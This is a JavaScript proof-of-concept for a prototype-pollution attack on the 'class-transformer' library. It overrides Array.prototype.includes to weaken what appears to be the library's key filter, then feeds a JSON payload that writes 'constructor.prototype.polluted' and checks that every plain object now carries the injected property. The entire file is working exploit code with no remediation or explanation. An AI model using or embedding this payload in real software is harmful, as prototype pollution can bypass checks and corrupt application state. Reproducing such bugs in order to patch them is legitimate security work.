Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const root = require('class-transformer');
const payload = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
root.classToPlainFromExist(payload, {});
console.log({}.polluted);